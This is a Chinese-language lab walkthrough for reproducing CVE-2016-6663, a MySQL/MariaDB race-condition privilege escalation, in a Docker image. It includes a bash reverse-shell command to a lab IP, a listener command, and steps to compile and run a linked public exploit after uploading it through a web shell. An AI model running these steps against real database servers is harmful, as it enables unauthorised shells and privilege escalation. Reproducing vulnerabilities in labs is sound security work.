# CVE-2016-6663

## 环境部署

```bash
# 拉取镜像
docker pull sqlsec/cve-2016-6663
# 部署镜像
docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663
```

添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：

```mysql
# 创建 test 数据库
mysql > create database test;

# 设置 test 密码为 123456
mysql > CREATE USER 'test'@'%' IDENTIFIED BY '123456'; 

# 赋予基础权限
mysql > grant create,drop,insert,select on test.* to 'test'@'%';

# 刷新权限
mysql > flush privileges;
```

## 漏洞复现

竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限

**利用成功条件**

1. Getshell 拿到 www-data 权限
2. 拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户
3. 关键提取步骤需要在交互环境下，所以需要反弹 shell
4. MySQL 版本需要 <=5.5.51 或 5.6.x <=5.6.32 或 5.7.x <=5.7.14 或 8.x < 8.0.1
5. MariaDB 版本需要 <= 5.5.51 或 10.0.x <= 10.0.27 或 10.1.x <= 10.1.17

CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：[MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit](https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)

![image-20211028180554314](https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028180554314.png)

通过蚁剑上传 EXP，然后 Bash 反弹 shell：

首先 192.168.201.144 端口开启监听：

```bash
ncat -lvp 2333
```

在蚁剑终端，反弹shell

```bash
bash -i >& /dev/tcp/192.168.201.144/2333 0>&1
```

编译[exp](http://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/mysql-privesc-race.c)

```bash
gcc mysql-privesc-race.c -o mysql-privesc-race -I /usr/include/mysql -lmysqlclient
```

执行exp提权

```bash
# ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库
./mysql-privesc-race test 123456 localhost test
```

![image-20211028185918252](https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028185918252.png)

